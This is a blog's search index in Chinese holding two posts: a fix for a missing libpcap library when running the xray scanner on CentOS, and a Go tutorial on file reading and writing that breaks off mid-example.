<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>记录Centos上使用xray时遇到的问题</title>
    <link href="/2023/11/05/%E8%AE%B0%E5%BD%95Centos%E4%B8%8A%E4%BD%BF%E7%94%A8xray%E6%97%B6%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/"/>
    <url>/2023/11/05/%E8%AE%B0%E5%BD%95Centos%E4%B8%8A%E4%BD%BF%E7%94%A8xray%E6%97%B6%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>今天在新的云服务器上使用xray 的时候，出现以下报错：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">xray_linux_amd64: error <span class="hljs-keyword">while</span> loading shared libraries: libpcap.so.0.8: cannot open shared object file: No such file or directory<br></code></pre></td></tr></table></figure><p>于是记录下解决方法，以后遇到相同问题可按照此方法解决</p><h2 id="2-解决方法"><a href="#2-解决方法" class="headerlink" title="2. 解决方法"></a>2. 解决方法</h2><p>这里的原因是运行时没找到相应的lib文件，但大多数时候并不是因为没有这个文件，而是没有配置好环境变量；</p><p>安装 libpcap</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo yum install libpcap<br></code></pre></td></tr></table></figure><p>然后locate命令去查看，定位出&#x2F;usr&#x2F;lib64目录下的三个文件，libpcap.so安装的是1.9.1版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@moka ~]<span class="hljs-comment"># locate libpcap</span><br>/usr/lib64/libpcap.so.1<br>/usr/lib64/libpcap.so.1.9.1<br>/usr/share/doc/libpcap<br>/usr/share/doc/libpcap/CHANGES<br>/usr/share/doc/libpcap/CREDITS<br>/usr/share/doc/libpcap/README.md<br>/usr/share/licenses/libpcap<br>/usr/share/licenses/libpcap/LICENSE<br></code></pre></td></tr></table></figure><p>查看&#x2F;usr&#x2F;lib64目录下的 libpcap.so.* 文件，发现libpcap.so和libpcap.so.1都是1.9.1版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -al /usr/lib64/libpcap.so.*<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@moka ~]<span class="hljs-comment"># ls -al /usr/lib64/libpcap.so.*</span><br>lrwxrwxrwx 1 root root     16 Jan 21  2021 /usr/lib64/libpcap.so.1 -&gt; libpcap.so.1.9.1<br>-rwxr-xr-x 1 root root 312232 Jan 21  2021 /usr/lib64/libpcap.so.1.9.1<br></code></pre></td></tr></table></figure><p>所以只需要在&#x2F;usr&#x2F;lib64&#x2F;目录下再建一个软链接文件就能成功解决问题了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /usr/lib64/<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s libpcap.so.1.9.1 libpcap.so.0.8<br></code></pre></td></tr></table></figure><p>使用命令再查看一次，已经成功搞定</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -al /usr/lib64/libpcap.so.*<br></code></pre></td></tr></table></figure><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202311051437436.png" alt="image-20231105143757382"></p><p>运行xray看看</p><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202311051438297.png" alt="image-20231105143826022"></p>]]></content>
    
    
    <categories>
      
      <category>安全工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xray</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Go语言的文件操作</title>
    <link href="/2023/09/11/Go%E8%AF%AD%E8%A8%80%E7%9A%84%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"/>
    <url>/2023/09/11/Go%E8%AF%AD%E8%A8%80%E7%9A%84%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/</url>
    
    <content type="html"><![CDATA[<h1 id="1-文件句柄-os-File"><a href="#1-文件句柄-os-File" class="headerlink" title="1. 文件句柄:os.File"></a>1. 文件句柄:os.File</h1><p><code>Go</code>语言的标准库<code>os</code>包下的<code>File</code>结构体表示一个文件句柄，获得了<code>os.File</code>，就可以对文件进行各种操作，有以下三种方式获得<code>os.File</code>文件句柄：</p><h2 id="1-1-os-Create"><a href="#1-1-os-Create" class="headerlink" title="1.1 os.Create"></a>1.1 os.Create</h2><p>通过<code>os.Create()</code>函数传入一个文件名称可以创建并获得一个表示该文件的<code>os.File</code>结构体</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">file,err := os.Create(<span class="hljs-string">&quot;./my.dat&quot;</span>)<br></code></pre></td></tr></table></figure><p>如果指定的文件不存在，调用该函数后，会创建文件，如果文件已经存在，则只会清空文件的内容。</p><h2 id="1-2-os-Open"><a href="#1-2-os-Open" class="headerlink" title="1.2 os.Open"></a>1.2 os.Open</h2><p>对于已经存在的文件，如果不想清空文件内容，只想打开该文件的话，可以用<code>os.Open()</code>函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">file, err := os.Open(<span class="hljs-string">&quot;./my.dat&quot;</span>)<br></code></pre></td></tr></table></figure><p>用该函数打开一个文件句柄时，如果文件不存在，返回值<code>err</code>返回一个<code>error</code>类型的错误。</p><h2 id="1-3-os-OpenFile"><a href="#1-3-os-OpenFile" class="headerlink" title="1.3 os.OpenFile"></a>1.3 os.OpenFile</h2><p>其实，<code>os.Create()</code>函数和<code>os.Open()</code>函数的底层都是调用<code>os.OpenFile()</code>函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Open</span><span class="hljs-params">(name <span class="hljs-type">string</span>)</span></span> (*File, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-keyword">return</span> OpenFile(name, O_RDONLY, <span class="hljs-number">0</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Create</span><span class="hljs-params">(name <span class="hljs-type">string</span>)</span></span> (*File, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-keyword">return</span> OpenFile(name, O_RDWR|O_CREATE|O_TRUNC, <span class="hljs-number">0666</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p><code>os.OpenFile()</code>函数签名如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">OpenFile</span><span class="hljs-params">(name <span class="hljs-type">string</span>, flag <span class="hljs-type">int</span>, perm FileMode)</span></span> (*File, <span class="hljs-type">error</span>) <br></code></pre></td></tr></table></figure><p>从函数签名可以看到调用<code>os.OpenFile</code>函数时要传入三个参数，其中<code>name</code>是表示要打开的文件名。</p><p>而第二个参数<code>flag</code>表示打开文件的标志，比较常用有以下几种取值：</p><ul><li>O_RDONLY：只读</li><li>O_WRONLY：只写</li><li>O_RDWR：读写</li><li>O_APPEND：以追加的方式写入</li><li>O_CREATE：文件不存在时创建</li><li>O_TRUNC：当文件存在时，将文件内容置空</li></ul><p>可以同时指定多个标志，多个标志用逻辑运算符<code>|</code>连接起来，比如<code>os.Create()</code>函数在调用<code>os.OpenFile</code>函数时就传入多个标志：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">OpenFile(name, O_RDWR|O_CREATE|O_TRUNC, <span class="hljs-number">0666</span>)<br></code></pre></td></tr></table></figure><p>无论是用哪种方式打开的文件句柄，最终都要记得关闭以释放资源，比较标准的用法是用<code>defer</code>语句：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go">name := <span class="hljs-string">&quot;./my.dat&quot;</span><br>file,err := OpenFile(name, O_RDWR|O_CREATE|O_TRUNC, <span class="hljs-number">0755</span>) <br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span>&#123;<br>  <span class="hljs-built_in">panic</span>(err)<br>&#125;<br><span class="hljs-keyword">defer</span> file.Close()<br></code></pre></td></tr></table></figure><h1 id="2-读取文件"><a href="#2-读取文件" class="headerlink" title="2. 读取文件"></a>2. 读取文件</h1><p>要读取文件的内容，在获得文件句柄时，<code>OpenFile</code>函数的参数<code>flag</code>只需要传<code>O_RDONLY</code>就可以了,而参数<code>FileMode</code>可以为<code>0</code>:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">file, err := os.OpenFile(<span class="hljs-string">&quot;./my.dat&quot;</span>, os.O_RDONLY, <span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p><code>os.File</code>有一个<code>Read()</code>方法，也就是说<code>os.File</code>实现<code>io.Reader</code>接口，Go标准库很多的包可以处理<code>io.Reader</code>接口，比如<code>ioutil</code>,<code>bufio</code>,<code>fmt</code>等，因此有很多种方式可以读取文件的内容。</p><h2 id="2-1-直接读取"><a href="#2-1-直接读取" class="headerlink" title="2.1 直接读取"></a>2.1 直接读取</h2><p><code>os.File</code>的<code>Read</code>方法就可以直接将文件内容读取一个字节数组中，并返回读取的长度和一个用于判断是否出错的<code>error</code>类型：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;io&quot;</span><br><span class="hljs-string">&quot;os&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>f, err := os.Open(<span class="hljs-string">&quot;./my.dat&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err)<br> &#125;<br> <span class="hljs-keyword">defer</span> f.Close()<br> <span class="hljs-keyword">for</span> &#123;<br>b := <span class="hljs-built_in">make</span>([]<span class="hljs-type">byte</span>, <span class="hljs-number">10</span>)<br>n, err := f.Read(b) <span class="hljs-comment">//将文件内容读取到字节数组中</span><br><span class="hljs-keyword">if</span> n == <span class="hljs-number">0</span> || err == io.EOF &#123;<br><span class="hljs-keyword">return</span><br> &#125;<br> fmt.Println(n, <span class="hljs-type">string</span>(b))<br>  &#125;<br> &#125;<br></code></pre></td></tr></table></figure><h2 id="2-2-使用bufio-包读取"><a href="#2-2-使用bufio-包读取" class="headerlink" title="2.2 使用bufio 包读取"></a>2.2 使用bufio 包读取</h2><p>当要用<code>bufio</code>包读取文件时，将调用<code>bufio.NewReader()</code>函数将<code>io.Reader</code>包装为一个<code>bufio.Reader</code>结构体，该结构体封装了很多更便捷读取文件的方法：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(b *Reader)</span></span> Read(p []<span class="hljs-type">byte</span>) (n <span class="hljs-type">int</span>, err <span class="hljs-type">error</span>)<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(b *Reader)</span></span> ReadByte() (<span class="hljs-type">byte</span>, <span class="hljs-type">error</span>)<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(b *Reader)</span></span> ReadBytes(delim <span class="hljs-type">byte</span>) ([]<span class="hljs-type">byte</span>, <span class="hljs-type">error</span>)<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(b *Reader)</span></span> ReadLine() (line []<span class="hljs-type">byte</span>, isPrefix <span class="hljs-type">bool</span>, err <span class="hljs-type">error</span>)<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(b *Reader)</span></span> ReadRune() (r <span class="hljs-type">rune</span>, size <span class="hljs-type">int</span>, err <span class="hljs-type">error</span>)<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(b *Reader)</span></span> ReadSlice(delim <span class="hljs-type">byte</span>) (line []<span class="hljs-type">byte</span>, err <span class="hljs-type">error</span>)<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(b *Reader)</span></span> ReadString(delim <span class="hljs-type">byte</span>) (<span class="hljs-type">string</span>, <span class="hljs-type">error</span>)<br></code></pre></td></tr></table></figure><p><code>ReadLine</code>方法的使用示例：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;bufio&quot;</span><br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;io&quot;</span><br><span class="hljs-string">&quot;os&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>file, err := os.OpenFile(<span class="hljs-string">&quot;./my.dat&quot;</span>, os.O_RDWR, <span class="hljs-number">0666</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err)<br>&#125;<br><span class="hljs-keyword">defer</span> file.Close()<br>reader := bufio.NewReader(file)<br><span class="hljs-keyword">for</span> &#123;<br>    <span class="hljs-comment">//按行读取</span><br>b, _, err := reader.ReadLine() <br><span class="hljs-keyword">if</span> err == io.EOF &#123;<br><span class="hljs-keyword">break</span><br>&#125;<br>fmt.Println(<span class="hljs-type">string</span>(b))<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-3-使用fmt包读取文件"><a href="#2-3-使用fmt包读取文件" class="headerlink" title="2.3 使用fmt包读取文件"></a>2.3 使用fmt包读取文件</h2><p><code>fmt</code>包以<code>FScan...</code>开头的函数可以按一定的格式扫描读取文件里的内容：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Fscan</span><span class="hljs-params">(r io.Reader, a ...any)</span></span> (n <span class="hljs-type">int</span>, err <span class="hljs-type">error</span>)<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Fscanf</span><span class="hljs-params">(r io.Reader, format <span class="hljs-type">string</span>, a ...any)</span></span> (n <span class="hljs-type">int</span>, err <span class="hljs-type">error</span>)<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Fscanln</span><span class="hljs-params">(r io.Reader, a ...any)</span></span> (n <span class="hljs-type">int</span>, err <span class="hljs-type">error</span>)<br></code></pre></td></tr></table></figure><p><code>Fscanln</code>方法的使用示例：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;io&quot;</span><br><span class="hljs-string">&quot;os&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>file, err := os.OpenFile(<span class="hljs-string">&quot;./my.dat&quot;</span>, os.O_RDWR, <span class="hljs-number">0666</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err)<br> &#125;<br> <span class="hljs-keyword">defer</span> file.Close()<br> <span class="hljs-keyword">for</span> &#123;<br><span class="hljs-keyword">var</span> a1, a2 <span class="hljs-type">string</span><br>_, err := fmt.Fscanln(file, &amp;a1, &amp;a2)<br>fmt.Println(a2, a2)<br><span class="hljs-keyword">if</span> err == io.EOF &#123;<br><span class="hljs-keyword">break</span><br> &#125;<br>  &#125;<br> &#125;<br></code></pre></td></tr></table></figure><h2 id="2-4-使用ioutil包读取文件"><a href="#2-4-使用ioutil包读取文件" class="headerlink" title="2.4 使用ioutil包读取文件"></a>2.4 使用ioutil包读取文件</h2><p>标准库的<code>ioutil</code>包对读取文件做好封装，可以直接读取整个文件的数据：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go">f, err := os.Open(<span class="hljs-string">&quot;./my.dat&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err)<br>&#125;<br><span class="hljs-keyword">var</span> b []<span class="hljs-type">byte</span><br>b,err := ioutil.ReadAll(f)<br></code></pre></td></tr></table></figure><p><code>ioutil</code>甚至封装了直接读取文件的函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> b []<span class="hljs-type">byte</span><br>b,err := ioutil.ReadFile(<span class="hljs-string">&quot;./my.dat&quot;</span>)<br></code></pre></td></tr></table></figure><h1 id="3-写入文件"><a href="#3-写入文件" class="headerlink" title="3. 写入文件"></a>3. 写入文件</h1><p>要向文件写入内容，在调用<code>OpenFile()</code>函数获得句柄时flag参数要传入<code>O_WRONLY</code>或者<code>O_RDWR</code>，如果是要往文件中以追加的形式在文件后面插入内容，还是需要<code>O_APPEND</code>:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">OpenFile(name, O_RDWR|O_CREATE|O_APPEND, <span class="hljs-number">0666</span>)<br></code></pre></td></tr></table></figure><p><code>os.File</code>有<code>Write</code>方法，也就是说<code>os.File</code>也实现了<code>io.Writer</code>接口，所以同样可以调用<code>fmt</code>、<code>bufio</code>、<code>ioutil</code>包将数据写入到文件中。</p><h2 id="3-1-直接写入"><a href="#3-1-直接写入" class="headerlink" title="3.1 直接写入"></a>3.1 直接写入</h2><p>写入文件最简单的方式就是调用<code>os.File</code>类型的<code>Write</code>方法写入一个字节数组：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;io&quot;</span><br><span class="hljs-string">&quot;os&quot;</span><br>)  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>file, err := os.OpenFile(<span class="hljs-string">&quot;./my.dat&quot;</span>, os.O_RDWR|os.O_CREATE, <span class="hljs-number">0666</span>)  <br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;  <br><span class="hljs-built_in">panic</span>(err)  <br>&#125;  <br> <span class="hljs-keyword">defer</span> file.Close()  <br> file.WriteString(<span class="hljs-string">&quot;hello moka\n&quot;</span>)  <br> file.Seek(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br> <span class="hljs-keyword">for</span> &#123;  <br><span class="hljs-keyword">var</span> a1, a2 <span class="hljs-type">string</span>  <br>_, err := fmt.Fscanln(file, &amp;a1, &amp;a2)  <br>fmt.Println(a1, a2)<br><span class="hljs-keyword">if</span> err == io.EOF &#123;<br><span class="hljs-keyword">break</span><br>&#125;  <br>&#125;  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-2-使用bufio包写入文件"><a href="#3-2-使用bufio包写入文件" class="headerlink" title="3.2 使用bufio包写入文件"></a>3.2 使用bufio包写入文件</h2><p><code>bufio</code>包的<code>NewWriter</code>可以将一个<code>io.Writer</code>包装为<code>bufio.Writer</code>结构体,该结构体主要有以下几个方法可以将数据写入文件：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(b *Writer)</span></span> Write(p []<span class="hljs-type">byte</span>) (nn <span class="hljs-type">int</span>, err <span class="hljs-type">error</span>)<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(b *Writer)</span></span> WriteByte(c <span class="hljs-type">byte</span>) <span class="hljs-type">error</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(b *Writer)</span></span> WriteRune(r <span class="hljs-type">rune</span>) (size <span class="hljs-type">int</span>, err <span class="hljs-type">error</span>)<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(b *Writer)</span></span> WriteString(s <span class="hljs-type">string</span>) (<span class="hljs-type">int</span>, <span class="hljs-type">error</span>)<br></code></pre></td></tr></table></figure><p><code>bufio</code>包的写入是带有缓冲区的，也就是说当写入数据时，不是立刻写入到文件，而是写到内存缓冲区，最后调用<code>Flush</code>方法才将数据写入文件。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;bufio&quot;</span><br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;io&quot;</span><br><span class="hljs-string">&quot;os&quot;</span><br>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>file, err:= os.OpenFile(<span class="hljs-string">&quot;./my.dat&quot;</span>, os.O_RDWR, <span class="hljs-number">0666</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err)<br> &#125;<br> <span class="hljs-keyword">defer</span> file.Close()<br> writer := bufio.NewWriter(file)<br><br> writer.Write([]<span class="hljs-type">byte</span>(<span class="hljs-string">&quot;hello mocha&quot;</span>))<br> writer.Flush()<br> file.Seek(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br> <span class="hljs-keyword">for</span> &#123;  <br><span class="hljs-keyword">var</span> a1, a2 <span class="hljs-type">string</span>  <br>_, err := fmt.Fscanln(file, &amp;a1, &amp;a2)  <br>fmt.Println(a1, a2)<br><span class="hljs-keyword">if</span> err == io.EOF &#123;<br><span class="hljs-keyword">break</span><br>&#125;  <br>&#125;<br> &#125;<br></code></pre></td></tr></table></figure><h2 id="3-3-使用fmt包写入文件"><a href="#3-3-使用fmt包写入文件" class="headerlink" title="3.3 使用fmt包写入文件"></a>3.3 使用fmt包写入文件</h2><p><code>fmt</code>包以下三个函数可以将格式化的数据写入到一个<code>io.Writer</code>:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Fprint</span><span class="hljs-params">(w io.Writer, a ...any)</span></span> (n <span class="hljs-type">int</span>, err <span class="hljs-type">error</span>)<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Fprintf</span><span class="hljs-params">(w io.Writer, format <span class="hljs-type">string</span>, a ...any)</span></span> (n <span class="hljs-type">int</span>, err <span class="hljs-type">error</span>)<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Fprintln</span><span class="hljs-params">(w io.Writer, a ...any)</span></span> (n <span class="hljs-type">int</span>, err <span class="hljs-type">error</span>)<br></code></pre></td></tr></table></figure><p>使用fmt写入文件的示例：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;io&quot;</span><br><span class="hljs-string">&quot;os&quot;</span><br>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>file, err := os.OpenFile(<span class="hljs-string">&quot;./my.dat&quot;</span>, os.O_RDWR, <span class="hljs-number">0666</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err)<br> &#125;<br><span class="hljs-keyword">defer</span> file.Close()<br>fmt.Fprintf(file, <span class="hljs-string">&quot;%s:%s&quot;</span>, <span class="hljs-string">&quot;username&quot;</span>, <span class="hljs-string">&quot;moka&quot;</span>)<br>file.Seek(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br><span class="hljs-keyword">for</span> &#123;  <br>   <span class="hljs-keyword">var</span> a1, a2 <span class="hljs-type">string</span>  <br>   _, err := fmt.Fscanln(file, &amp;a1, &amp;a2)  <br>   fmt.Println(a1, a2)<br>   <span class="hljs-keyword">if</span> err 